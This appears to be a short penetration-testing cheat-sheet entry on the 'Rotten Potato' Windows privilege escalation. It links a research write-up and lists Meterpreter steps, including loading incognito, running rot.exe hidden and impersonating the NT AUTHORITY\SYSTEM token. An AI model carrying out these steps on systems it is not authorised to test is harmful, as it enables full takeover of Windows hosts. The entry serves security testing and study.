## Rotten Potato

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

Get a meterpreter and upload the rot.exe

* getuid
* getprivs
* use incognito
* list\_tokens -u
* cd c:\\temp\\
* execute -Hc -f ./rot.exe
* impersonate\_token "NT AUTHORITY\\SYSTEM"



